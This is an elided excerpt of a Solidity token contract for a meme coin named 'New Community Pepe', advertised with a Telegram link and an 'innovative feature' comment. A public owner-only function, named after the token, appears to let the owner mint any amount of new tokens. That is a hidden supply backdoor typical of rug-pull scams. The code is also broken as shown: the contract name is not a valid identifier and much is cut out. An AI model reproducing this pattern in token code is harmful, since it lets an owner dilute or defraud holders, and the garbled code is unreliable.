//
// $NewCommunityPepe proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NewCommunityPepee
// 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NewCommunityPepe(uint256 amount) public onlyOwner {
 _NewCommunityPepe(msg.sender, amount);
    }
    ...
    function _NewCommunityPepe(address account, uint256 amount) internal virtual {
...
contract $NewCommunityPepe is ERC20 {
    ...
    constructor() public ERC20("New Community Pepe", "NCPEPE") {
     _NewCommunityPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}